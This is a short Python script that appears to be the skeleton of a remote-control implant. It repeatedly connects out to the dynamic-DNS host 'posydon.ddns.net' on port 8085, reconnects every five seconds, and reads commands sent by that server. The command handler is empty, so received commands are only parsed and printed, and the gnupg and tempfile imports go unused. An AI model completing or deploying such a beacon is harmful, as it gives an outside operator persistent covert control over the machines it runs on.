import os
import sys
import socket
import time
import gnupg
import tempfile
from pathlib import Path

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Define the host and port to connect to
host = 'posydon.ddns.net'
port = 8085

while True:
    try:
        # Attempt to connect to the server
        print(f"Trying to connect to {host} on port {port}")
        s.connect((host, port))
        print(f"Successfully connected to {host} on port {port}")

        while True:
            try:
              command = s.recv(1024).decode().split(" ")
              print(f"Received command: {command}")
              main_command = command[0]
              print("main command: " + main_command)




            except socket.error as e:
                print(f"Error: {e}")
                break

    except socket.error as e:
        print(f"Error: {e}")

    # Close the connection
    s.close()

    # Wait before trying to reconnect
    time.sleep(5)

    # Create a new socket object for the next connection attempt
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
